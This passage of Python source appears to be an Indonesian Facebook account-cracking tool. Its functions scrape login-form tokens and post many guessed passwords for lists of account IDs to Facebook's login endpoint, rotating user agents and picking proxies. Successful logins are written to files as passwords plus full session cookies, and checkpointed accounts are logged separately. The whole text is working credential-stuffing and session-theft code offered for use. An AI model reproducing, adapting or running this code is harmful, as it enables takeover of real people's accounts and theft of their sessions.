                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break

            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
                prog.update(des, description=f" {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]", end="")
                prog.advance(des)
                time.sleep(10)

            else:
                continue

        except requests.exceptions.ConnectionError:
            time.sleep(31)

    loop += 1

#-------------------[ CRACK-MAIN ]------------#
def fanky_b_apiiiubj(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	ses = requests.Session()
	prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			requ=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
			datasayainifanky = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1), "li": re.search('name="li" value="(.*?)"', requ.text).group(1), "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(requ.text)).group(1), "try_number": re.search('name="try_number" value="(.*?)"', str(requ.text)).group(1), "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(requ.text)).group(1), "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(requ.text)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(requ.text)).group(1), "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
			kepalafanky= {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,id;q=0.8", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Referer": "https://iphone.facebook.com/", "Cache-Control": "max-age=0", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://iphone.facebook.com", "X-Requested-With": "XMLHttpRequest", "DNT": "1", "X-FB-HTTP-Engine": "Liger"}
			fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
			po = session.post(fankyimut,headers=kepalafanky, data=datasayainifanky, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict():
				cp += 1
				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
				break
			elif "c_user" in ses.cookies.get_dict():
				ok += 1
				coki = ses.cookies.get_dict()
				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def fanky_b_api(idf, pwv):
    global loop, ok, cp
    rr = random.randint
    rc = random.choice
    bo = random.choice([m, k, h, b, u, x])
    # ua = random.choice(fanuahehe)
    ua = random.choice(fanuahehe)
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    for pw in pwv:
        try:
            if 'ya' in ualuh:ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "prefill_contact_point": idf,
                "prefill_source": "provided_or_soft_matched",
                "prefill_type": "contact_point",
                "first_prefill_source": "provided_or_soft_matched",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": "true",
                "had_password_prefilled": "false",
                "is_smart_lock": "false",
                "_fb_noscript": "true",
                "email": idf,
                "pass": pw
            }
            head = {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": "https://iphone.facebook.com/",
                "Origin": "https://iphone.facebook.com",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "DNT": "1"
            }
            fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.system("touch .prox.txt")
    except:
        pass
    try:
        clear()
    except:
        pass
    login()
    
